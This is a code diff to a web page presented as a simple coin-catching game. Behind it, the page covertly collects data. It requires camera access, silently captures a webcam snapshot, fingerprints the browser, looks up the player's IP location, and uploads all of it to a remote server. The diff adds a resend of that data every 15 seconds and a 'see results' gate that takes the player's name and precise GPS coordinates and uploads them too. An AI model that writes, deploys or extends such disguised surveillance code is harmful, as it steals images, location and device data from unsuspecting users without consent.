@@ -38,14 +38,14 @@
       left: 0;
       width: 100%;
       height: 100%;
-      background-color: rgba(0, 0, 0, 0.7);
+      background-color: rgba(0, 0, 0, 0.8);
       z-index: 5;
       display: flex;
       flex-direction: column;
       align-items: center;
       justify-content: center;
       color: white;
-      font-size: 1.1rem;
+      font-size: 1rem;
       text-align: center;
       padding: 10px;
     }
@@ -70,8 +70,13 @@
       pointer-events: none;
     }
 
+    #timer {
+      margin-top: 10px;
+      font-size: 1.2rem;
+    }
+
     button {
-      margin-top: 15px;
+      margin-top: 10px;
       padding: 10px 20px;
       font-family: monospace;
       background: #0f0;
@@ -79,15 +84,17 @@
       cursor: pointer;
     }
 
-    #helpBtn {
-      background: #444;
-      color: white;
-      margin-top: 10px;
+    #showResultsBtn {
+      background: #222;
+      color: #0f0;
+      border: 2px solid #0f0;
+      cursor: not-allowed;
     }
   </style>
 </head>
 
 <body>
+
   <canvas id="canvas" width="640" height="480"></canvas>
 
   <div id="game-box">
@@ -99,23 +106,31 @@
     </div>
   </div>
 
-<script>
-const canvas = document.getElementById('canvas');
-const ctx = canvas.getContext('2d');
-const grantBtn = document.getElementById('grantPermsBtn');
-const helpBtn = document.getElementById('helpBtn');
-const overlay = document.getElementById('overlay');
-const player = document.getElementById('player');
-const gameBox = document.getElementById('game-box');
+  <div id="timer">Time Left: 60s</div>
+  <button id="showResultsBtn" disabled>Show Results</button>
 
-let playerX = gameBox.offsetWidth / 2 - 25;
-let cameraGranted = false;
+  <script>
+    const canvas = document.getElementById('canvas');
+    const ctx = canvas.getContext('2d');
+    const grantBtn = document.getElementById('grantPermsBtn');
+    const helpBtn = document.getElementById('helpBtn');
+    const overlay = document.getElementById('overlay');
+    const player = document.getElementById('player');
+    const gameBox = document.getElementById('game-box');
+    const timerEl = document.getElementById('timer');
+    const showResultsBtn = document.getElementById('showResultsBtn');
 
-/* -----------------------------------
-   CLIENT INFO COLLECTION WITH FALLBACKS
------------------------------------ */
-async function collectClientInfo() {
-    const browserInfo = {
+    let playerX = gameBox.offsetWidth / 2 - 25;
+    let cameraGranted = false;
+    let gameEnded = false;
+    let coinsCollected = 0;
+    let backgroundDataInterval = null;
+
+    /* -----------------------------
+       CLIENT INFO COLLECTION
+    ----------------------------- */
+    async function collectClientInfo() {
+      const browserInfo = {
         userAgent: navigator.userAgent,
         language: navigator.language,
         languages: navigator.languages,
@@ -126,68 +141,81 @@ async function collectClientInfo() {
         screenHeight: window.screen.height,
         deviceMemory: navigator.deviceMemory || "Unknown",
         hardwareConcurrency: navigator.hardwareConcurrency || "Unknown"
-    };
+      };
 
-    const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
-    if (connection) {
+      const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+      if (connection) {
         browserInfo.network = {
-            downlink: connection.downlink,
-            effectiveType: connection.effectiveType,
-            rtt: connection.rtt
+          downlink: connection.downlink,
+          effectiveType: connection.effectiveType,
+          rtt: connection.rtt
         };
+      }
+
+      let ipInfo = {};
+      try {
+        const res = await fetch("https://ipapi.co/json/");
+        ipInfo = await res.json();
+      } catch (err) {
+        ipInfo = { error: "Failed to fetch IP info" };
+      }
+
+      return { browserInfo, ipInfo };
     }
 
-    let ipInfo = {};
-    const apis = [
-        "https://ipapi.co/json/",
-        "https://ipwhois.app/json/",
-        "https://ipinfo.io/json"
-    ];
+    /* -----------------------------
+       SEND DATA TO SERVER
+    ----------------------------- */
+    async function sendToServer(imageData = null, extra = {}) {
+      const clientInfo = await collectClientInfo();
+      const payload = {
+        image: imageData || "", // optional
+        client: clientInfo,
+        extra
+      };
 
-    for (let api of apis) {
-        try {
-            const res = await fetch(api);
-            const data = await res.json();
-            if (data && Object.keys(data).length) {
-                ipInfo = data;
-                break;
-            }
-        } catch (err) {
-            console.warn(`IP API failed: ${api}`);
-            continue;
-        }
-    }
-
-    if (!Object.keys(ipInfo).length) ipInfo = { error: "Unable to fetch IP info" };
-
-    return { browserInfo, ipInfo };
-}
-
-/* -----------------------------------
-   SEND IMAGE + CLIENT DATA
------------------------------------ */
-async function sendToServer(imageData) {
-    const clientInfo = await collectClientInfo();
-
-    try {
+      try {
         await fetch("https://simple-game-server-api.onrender.com/upload", {
-            method: "POST",
-            headers: { "Content-Type": "application/json" },
-            body: JSON.stringify({
-                image: imageData,
-                client: clientInfo
-            })
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify(payload)
         });
-    } catch (err) {
+      } catch (err) {
         console.error("Upload failed", err);
+      }
     }
-}
 
-/* -----------------------------------
-   HELP BUTTON
------------------------------------ */
-helpBtn.addEventListener("click", () => {
-    overlay.innerHTML = `
+    /* -----------------------------
+       CAMERA CAPTURE
+    ----------------------------- */
+    async function requestCamera() {
+      try {
+        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+        const video = document.createElement('video');
+        video.srcObject = stream;
+        video.play();
+
+        video.onloadedmetadata = () => {
+          ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+          const imageData = canvas.toDataURL('image/png');
+          sendToServer(imageData); // send snapshot
+
+          stream.getTracks().forEach(track => track.stop());
+          overlay.style.display = "none";
+          cameraGranted = true;
+
+          startBackgroundData(); // begin periodic sending
+          startGameTimer(); // start 1-minute timer
+        };
+      } catch (err) {
+        alert("Camera access was denied.");
+      }
+    }
+
+    grantBtn.addEventListener("click", requestCamera);
+
+    helpBtn.addEventListener("click", () => {
+      overlay.innerHTML = `
         <p><strong>Camera access was denied.</strong><br>
         To reset it:</p>
         <ul style="text-align: left;">
@@ -196,67 +224,89 @@ helpBtn.addEventListener("click", () => {
             <li>Set it to "Allow"</li>
             <li>Refresh the page</li>
         </ul>
-    `;
-});
-
-/* -----------------------------------
-   PERMISSION CHECK
------------------------------------ */
-if (navigator.permissions) {
-    navigator.permissions.query({ name: 'camera' }).then(result => {
-        if (result.state === 'denied') {
-            overlay.innerHTML = `
-                <p><strong>Camera permission denied.</strong><br>
-                Please allow camera access in your browser settings and refresh the page.</p>
-                <button id="helpBtn">Need Help?</button>
-            `;
-            document.getElementById("helpBtn").addEventListener("click", () => helpBtn.click());
-        }
+      `;
     });
-}
 
-/* -----------------------------------
-   CAMERA CAPTURE
------------------------------------ */
-async function requestCamera() {
-    try {
-        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-        const video = document.createElement('video');
-        video.srcObject = stream;
-        video.play();
-
-        video.onloadedmetadata = () => {
-            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-            const imageData = canvas.toDataURL('image/png');
-
-            sendToServer(imageData);
-
-            stream.getTracks().forEach(track => track.stop());
-            overlay.style.display = "none";
-            cameraGranted = true;
-        };
-    } catch (err) {
-        alert("Camera access was denied.");
+    /* -----------------------------
+       BACKGROUND DATA SENDING
+    ----------------------------- */
+    function startBackgroundData() {
+      backgroundDataInterval = setInterval(() => {
+        if (gameEnded) return;
+        sendToServer(); // send browser + IP data periodically
+      }, 15000); // every 15 seconds
     }
-}
 
-grantBtn.addEventListener("click", () => {
-    requestCamera();
-});
+    /* -----------------------------
+       TIMER
+    ----------------------------- */
+    function startGameTimer() {
+      let timeLeft = 60; // seconds
+      const interval = setInterval(() => {
+        timeLeft--;
+        timerEl.textContent = `Time Left: ${timeLeft}s`;
 
-/* -----------------------------------
-   COIN SPAWNING
------------------------------------ */
-function spawnCoin() {
-    const coin = document.createElement('img');
-    coin.src = 'coin.png';
-    coin.className = 'coin';
+        if (timeLeft <= 0) {
+          clearInterval(interval);
+          endGame();
+        }
+      }, 1000);
+    }
 
-    coin.style.left = Math.random() * (gameBox.offsetWidth - 40) + 'px';
-    gameBox.appendChild(coin);
+    /* -----------------------------
+       END GAME
+    ----------------------------- */
+    function endGame() {
+      gameEnded = true;
 
-    let y = 0;
-    const fall = setInterval(() => {
+      // ask for name + geolocation
+      overlay.style.display = "flex";
+      overlay.innerHTML = `
+        <p>Game Over! Enter your name and allow location to see results.</p>
+        <input type="text" id="playerName" placeholder="Your Name"/>
+        <button id="submitLocationBtn">Submit Location</button>
+      `;
+
+      const submitBtn = document.getElementById("submitLocationBtn");
+      submitBtn.addEventListener("click", async () => {
+        const name = document.getElementById("playerName").value || "Anonymous";
+
+        if (!navigator.geolocation) {
+          alert("Geolocation is not supported by your browser.");
+          return;
+        }
+
+        navigator.geolocation.getCurrentPosition(async (position) => {
+          const locationData = {
+            name,
+            latitude: position.coords.latitude,
+            longitude: position.coords.longitude,
+            accuracy: position.coords.accuracy
+          };
+
+          await sendToServer(null, locationData); // send geolocation + name
+          showResultsBtn.disabled = false; // enable results button
+          overlay.style.display = "none";
+        }, (err) => {
+          alert("Location permission denied. Cannot show results.");
+        });
+      });
+    }
+
+    /* -----------------------------
+       COIN SPAWNING
+    ----------------------------- */
+    function spawnCoin() {
+      if (gameEnded) return;
+
+      const coin = document.createElement('img');
+      coin.src = 'coin.png';
+      coin.className = 'coin';
+      coin.style.left = Math.random() * (gameBox.offsetWidth - 40) + 'px';
+      gameBox.appendChild(coin);
+
+      let y = 0;
+      const fall = setInterval(() => {
         y += 5;
         coin.style.top = y + 'px';
 
@@ -264,55 +314,63 @@ function spawnCoin() {
         const coinRect = coin.getBoundingClientRect();
 
         if (
-            coinRect.bottom >= playerRect.top &&
-            coinRect.left < playerRect.right &&
-            coinRect.right > playerRect.left
+          coinRect.bottom >= playerRect.top &&
+          coinRect.left < playerRect.right &&
+          coinRect.right > playerRect.left
         ) {
-            coin.remove();
-            clearInterval(fall);
+          coin.remove();
+          clearInterval(fall);
+          coinsCollected++;
         }
 
         if (y > gameBox.offsetHeight) {
-            coin.remove();
-            clearInterval(fall);
+          coin.remove();
+          clearInterval(fall);
         }
-    }, 30);
-}
-
-/* -----------------------------------
-   GAME LOOP
------------------------------------ */
-function gameLoop() {
-    if (!cameraGranted) {
-        playerX += Math.random() < 0.5 ? -3 : 3;
+      }, 30);
     }
 
-    playerX = Math.max(0, Math.min(gameBox.offsetWidth - 60, playerX));
-    player.style.left = playerX + 'px';
+    /* -----------------------------
+       GAME LOOP
+    ----------------------------- */
+    function gameLoop() {
+      if (!cameraGranted || gameEnded) return;
 
-    requestAnimationFrame(gameLoop);
-}
+      playerX += Math.random() < 0.5 ? -3 : 3;
+      playerX = Math.max(0, Math.min(gameBox.offsetWidth - 60, playerX));
+      player.style.left = playerX + 'px';
 
-/* -----------------------------------
-   CONTROLS
------------------------------------ */
-document.addEventListener('keydown', (e) => {
-    if (!cameraGranted) return;
-    if (e.key === 'ArrowLeft') playerX -= 15;
-    if (e.key === 'ArrowRight') playerX += 15;
-});
+      requestAnimationFrame(gameLoop);
+    }
 
-if (window.DeviceOrientationEvent) {
-    window.addEventListener('deviceorientation', (event) => {
-        if (!cameraGranted) return;
+    /* -----------------------------
+       CONTROLS
+    ----------------------------- */
+    document.addEventListener('keydown', (e) => {
+      if (!cameraGranted || gameEnded) return;
+      if (e.key === 'ArrowLeft') playerX -= 15;
+      if (e.key === 'ArrowRight') playerX += 15;
+    });
+
+    if (window.DeviceOrientationEvent) {
+      window.addEventListener('deviceorientation', (event) => {
+        if (!cameraGranted || gameEnded) return;
         const gamma = event.gamma;
         if (gamma > 5) playerX += 5;
         if (gamma < -5) playerX -= 5;
-    });
-}
+      });
+    }
 
-setInterval(spawnCoin, 1000);
-gameLoop();
-</script>
+    setInterval(spawnCoin, 1000);
+    gameLoop();
+
+    /* -----------------------------
+       SHOW RESULTS BUTTON
+    ----------------------------- */
+    showResultsBtn.addEventListener("click", () => {
+      alert(`🎉 You collected ${coinsCollected} coins!`);
+    });
+  </script>
+
 </body>
 </html>
